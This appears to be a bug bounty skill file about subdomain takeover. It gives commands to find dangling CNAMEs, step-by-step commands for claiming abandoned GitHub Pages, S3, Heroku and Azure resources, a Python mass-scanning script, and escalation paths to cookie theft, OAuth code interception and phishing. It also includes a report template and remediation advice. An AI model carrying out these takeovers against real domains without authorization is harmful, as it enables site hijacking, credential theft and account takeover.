---
name: hunt-subdomain-takeover
description: Subdomain takeover — dangling CNAME detection, platform-specific claims, mass automation, escalation to XSS/ATO.
---

# SUBDOMAIN TAKEOVER

## Overview
DNS CNAME points to external service nobody claimed. Register it, serve content on their subdomain.

## Complete Flow
```
1. Enumerate subdomains → extract CNAMEs
2. Check if referenced resource exists (dangling CNAME)
3. Claim the resource on the platform
4. Deploy content (XSS, phishing)
5. Report with impact (XSS, ATO)
```

## Real Bounty Examples
- **HackerOne #1709887** — GitHub Pages, $500. `docs.target.com` CNAME to `target.github.io`. Repo deleted, claimed it, XSS on target.com origin.
- **HackerOne #1524161** — S3 bucket, $750. `assets.target.com` CNAME to `target-assets.s3.amazonaws.com`. Bucket unclaimed, registered, served phishing.
- **HackerOne #1289729** — Heroku, $300. `api.target.com` CNAME to `target-api.herokuapp.com`. App deleted, recreated, cookie-stealing JS.
- **Bugcrowd #555512** — Shopify, $1,000. `shop.target.com` CNAME to `target.myshopify.com`. Store unclaimed, created with fake checkout.

## Detection

### CNAME Extraction
```bash
dnsx -l subs.txt -cname -resp -o cnames.txt
# Or massdns
cat subs.txt | massdns -r resolvers.txt -t CNAME -o S -w cnames_raw.txt
grep -oP 'CNAME\s+\K[^\s]+' cnames_raw.txt | sort -u > dangling.txt
```

### Dangling Check
```bash
httpx -l subs.txt -sc -cl -title -o http_results.txt
# Manual
curl -sI "https://sub.target.com" | head -5
# 000/502/503/404 = likely dangling
```

### Platform Fingerprinting
```
github.io         → GitHub Pages      herokuapp.com     → Heroku
s3.amazonaws.com  → AWS S3            azurewebsites.net → Azure
shopify.com       → Shopify           fastly.net        → Fastly
netlify.app       → Netlify           vercel.app        → Vercel
firebaseapp.com   → Firebase          pages.dev         → Cloudflare Pages
pantheon.io       → Pantheon          onrender.com      → Render
railway.app       → Railway           ghost.io          → Ghost
```

## Platform-Specific Claims

### GitHub Pages
```bash
# Check: 404 = takeable
curl -s -o /dev/null -w "%{http_code}" "https://github.com/ORG/REPO-NAME"
# Create repo matching CNAME (abc.github.com → repo: abc)
echo '<h1>Hacked</h1>' > index.html
git init && git add . && git commit -m "xss"
git remote add origin git@github.com:USER/REPO-NAME.git
git push -u origin master
# Enable Pages in Settings → Source: main
```

### AWS S3
```bash
# Check: NoSuchBucket = takeable
aws s3 ls s3://BUCKET-NAME 2>&1
# Create + configure
aws s3 mb s3://BUCKET-NAME --region us-east-1
aws s3 website s3://BUCKET-NAME --index-document index.html
# Set public read policy, upload index.html
```

### Heroku
```bash
# Check: 404 = takeable
curl -s -o /dev/null -w "%{http_code}" "https://APP-NAME.herokuapp.com"
heroku create APP-NAME
# Deploy simple node app with XSS payload
git push heroku master
```

### Azure
```bash
# Check: 404 = takeable
az webapp create --resource-group myRG --plan myPlan --name APP-NAME
```

### Shopify
```bash
# Check: 404 = takeable
# Create partner account → store name = subdomain (shop.target.com → shop.myshopify.com)
```

### Fastly
```bash
# Check: "no such service" error
# Sign up → create service → add custom domain matching CNAME
```

## Mass Detection Script
```python
#!/usr/bin/env python3
import subprocess, json

VULN = ['github.io','s3.amazonaws.com','herokuapp.com','azurewebsites.net',
        'shopify.com','fastly.net','netlify.app','vercel.app','firebaseapp.com']

def check(sub):
    try:
        r = subprocess.run(['dig','CNAME',sub,'+short'], capture_output=True, text=True, timeout=5)
        cname = r.stdout.strip()
        if not cname: return None
        for svc in VULN:
            if svc in cname.lower():
                h = subprocess.run(['curl','-sI','-o','/dev/null','-w','%{http_code}',
                    f'https://{sub}'], capture_output=True, text=True, timeout=5)
                if h.stdout.strip() in ['000','404','502','503']:
                    return {'sub':sub,'cname':cname,'svc':svc,'vuln':True}
    except: pass

with open('subs.txt') as f:
    subs = [l.strip() for l in f if l.strip()]
results = [r for s in subs if (r:=check(s))]
for r in results: print(f"[VULN] {r['sub']} → {r['cname']}")
json.dump(results, open('takeover.json','w'), indent=2)
print(f"Found {len(results)} candidates")
```

## Escalation to ATO
```
XSS on Origin:
  Subdomain takeover + XSS → execute on target.com
  → Steal cookies → Account takeover
  → Steal CSRF tokens → Perform actions as victim

OAuth Abuse:
  Takeover as redirect_uri → intercept auth codes
  → Exchange for tokens → Full account access

Phishing:
  Serve realistic login page → victim enters credentials
  → Attacker captures → Account takeover

Session Fixation:
  Inject session token via XSS → victim uses fixed session
  → Attacker uses same session ID → Full access
```

## Reporting Template
```
Title: Subdomain Takeover on [sub.target.com]

Summary:
DNS CNAME for [sub.target.com] points to [service] but resource 
is unclaimed. I registered it and served arbitrary content on 
target.com origin.

Impact:
- XSS on target.com (same-origin policy applies)
- Cookie theft → ATO
- Phishing via realistic login page
- OAuth redirect_uri abuse

Steps to Reproduce:
1. Enumerate subdomains → CNAME to [service]
2. Verify unclaimed (404/502 response)
3. Claim on [platform]
4. Deploy content
5. Visit https://sub.target.com → see attacker content

Remediation:
- Remove unused CNAME records
- Delete orphaned resources
- Monitor DNS for dangling records
```

## Key Indicators
- CNAME to external service + HTTP 404/502/503 = takeover candidate
- Always check same-origin XSS impact
- Cookie theft = ATO escalation
